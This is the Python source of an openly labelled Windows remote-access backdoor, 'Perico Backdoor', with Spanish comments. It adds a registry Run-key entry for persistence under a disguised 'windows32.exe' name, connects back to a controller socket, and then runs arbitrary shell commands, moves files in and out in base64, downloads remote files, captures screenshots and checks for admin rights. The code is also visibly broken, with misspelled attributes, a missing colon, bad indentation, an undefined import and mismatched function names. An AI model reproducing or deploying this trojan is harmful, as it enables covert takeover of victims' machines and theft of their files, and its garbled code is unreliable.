#***************************************************************************#
# Perico Backdoor : ver 3.6.1                                               *
# Author : Bruno A. Diaz                                                    *
# Blackhat : Arsenal Edition                                                *
# OS: BlackArch                                                             *
#***************************************************************************#


#/usr/bin/env python
#_*_ coding: utf8 _*_
# Servidor socket, PericoRx en python
#
import socket
import os
import subprocess
import base64
import requests
import mss
import time
import shutil


def ascii_art():
    print("    ___           __      __              ")
    print("   / _ )___ _____/ /_____/ /__  ___  ____ ")
    print("  / _  / _ `/ __/  '_/ _  / _ \/ _ \/ __/ ")
    print(" /____/\_,_/\__/_/\_\\\\_,_/\___/\___/_/  ")

def ascii_art():
    print("   @@@@@   @@@@@@ @@@@@@@ @@@@@@@   @@@  @@@   @@@  ")
    print("  @@  @@@ !@@       @!!   @@!  @@@  @@!  @@!   !@@  ")
    print("  @@! @@@ !@@       @!!   @@!  @@@  @@!   !@@!@!    ")
    print("  @!@!@!@! !@@!!    !!:   @!@!!@!   !!@    !::!!    ")
    print("  !!:  !!!    !:!   !!:   !!: :!!   !!:   !: :!!    ")
    print("   :   !!!     :     :    !!: :!!   !!:  :::  :::   ")
    print("   :   : :::.: :     :     :   : :   :  :::    :::  ")

def admin_check():
  global admin
  try:
    check = os.listdir(os.sep.join([os.eviron.get("SystemRoot",'C:\windows'),'temp']))
  except:
    admin = "Error, Privilegios insuficientes...?"
  else:
    admin = "Privilegios de administrador...!"

def create_persistence():
  location = os.eviron['appdate'] + '\\windows32.exe'
  if not os.path.exists(location):
  shutil.copyfile(sys.executable,location)
  subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "'+ location + '"', shell=True)

def connection():
  while True:
    time.sleep(5)
    try:
      cliente.connect(("127.0.0.1", 7777))
      shell()
    except:
      connection()

def captura_pantalla()
    screen = mss.mss()
    screen.shot()

def download_fle(url):
    consulta = requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file,'wb') as file_get:
      file_get.write(consulta.content)

def shell():
  current_dir = os.getcwd()
  cliente.send(current_dir)
  while True:
    res = cliente.recv(1024)
    if res == "exit":
       break
     elif res[:2] == "cd" and len(res) > 2:
       os.chdir = os.getcwd()
       cliente.send(result)
     elif res[:8] == "download":
       with open(res[9:],'rb') as file_download:
         cliente.send(base64.b64encode(file_download.read()))
    elif res[:6] == "upload":
      with open(res[7:],'wb') as  file_upload:
        datos = cliente.recv(60000)
        file_upload.write(base64.b64decode(datos))
    elif res[:3] == "get":
        try:
          download_file(res[4:])
          cliente.send("Archivo descargado correctamente...!")
        except:
          cliente.send("Ocurrio un error en la descarga...?")
    elif res[:10] == "screenshot":
      try:
        captura_pantalla()
        with open('monitor-1.png','rb') as file_send:
          cliente.send(base64.b64encode(file_send.read()))
          os.remove("monitor-1.png")
      except:
        cliente.send(base64.b64encode("fail"))
    elif res[:5] == "start":
      try:
        subprocess.Popen(res[6:],shell=True)
        cliente.send("Programa iniciado con exito...!")
      except:
        cliente.send("Error de inicio...!")
    elif res[:5] == "check":
      try:
        admin_check()
        cliente.send(admin)
      except:
        cliente.send("Error, nose pudo ejecutar la tarea...?")
    else:
      proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      result = proc.stdout.read() + proc.stderr.read()
      if len(result) == 0:
          cliente.send("1")
      else:
          cliente.send(result)

create_perpesistence()
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
cliente.close()
